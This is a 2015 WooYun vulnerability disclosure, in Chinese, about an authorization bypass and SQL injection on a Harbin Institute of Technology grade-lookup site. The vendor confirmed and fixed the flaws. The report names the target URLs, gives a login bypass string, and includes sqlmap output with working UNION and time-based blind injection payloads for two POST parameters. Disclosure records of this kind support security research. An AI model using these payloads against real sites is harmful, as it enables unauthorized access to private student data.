wybug_title: 哈尔滨工业大学某站越权+sql注入
wybug_detail:
漏洞详情 披露状态：   									2015-08-04：	细节已通知厂商并且等待厂商处理中									2015-08-04：	厂商已经确认，细节仅向厂商公开									2015-08-14：	细节向核心白帽子及相关领域专家公开									2015-08-24：	厂商已经修复漏洞并主动公开，细节向公众公开  简要描述： RT 详细说明：  0x01： 越权查看成绩地址：http://am.hit.edu.cn/zpy/mdscorelogin.php用户名: ' or 1=1 #密码任意

0x02: sql注入http://am.hit.edu.cn/zpy/mdscorecheck.php   POST型 可UNION
Parameter: fullname (POST)    Type: UNION query    Title: MySQL UNION query (NULL) - 13 columns    Payload: fullname=123' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x716b6b6a71,0x484956766d6d49514b6d,0x71627a6271),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#&studentid=123    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind (SELECT)    Payload: fullname=123' AND (SELECT * FROM (SELECT(SLEEP(5)))WSDu) AND 'ungD'='ungD&studentid=123Parameter: studentid (POST)    Type: UNION query    Title: MySQL UNION query (NULL) - 13 columns    Payload: fullname=123&studentid=123' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x716b6b6a71,0x66544274457a4a756f44,0x71627a6271),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind (SELECT)    Payload: fullname=123&studentid=123' AND (SELECT * FROM (SELECT(SLEEP(5)))vosv) AND 'trWh'='trWh---there were multiple injection points, please select the one to use for following injections:[0] place: POST, parameter: fullname, type: Single quoted string (default)[1] place: POST, parameter: studentid, type: Single quoted string[q] Quit> 1
两个参数都存在注入

   漏洞证明：  = .=   修复方案：  过滤   版权声明：转载请注明来源 路人甲@乌云
wybug_reply: 漏洞回应  厂商回应： 危害等级：低 漏洞Rank：5  确认时间：2015-08-04 13:29 厂商回复： 谢谢 最新状态： 2015-08-24：已经修复，谢谢
